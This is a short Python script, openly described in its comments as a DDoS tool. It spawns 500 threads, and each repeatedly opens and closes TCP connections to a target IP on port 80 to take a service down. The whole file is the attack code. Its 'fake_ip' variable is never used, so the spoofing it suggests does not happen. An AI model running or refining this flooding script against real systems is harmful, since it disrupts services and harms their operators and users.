import threading
import socket

target= '192.168.0.1'
# Depending on the service you want to take down you DDOS different ports

port=80
fake_ip='182.21.20.31'

already_connected=0
# Defining the attack method
def attack():
    while True:
        s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        
        s.close()


        global already_connected
        already_connected+=1
        print(already_connected)
        if already_connected % 500 == 0:
            print(already_connected)

for i in range(500):
    thread=threading.Thread(target=attack)
    thread.start()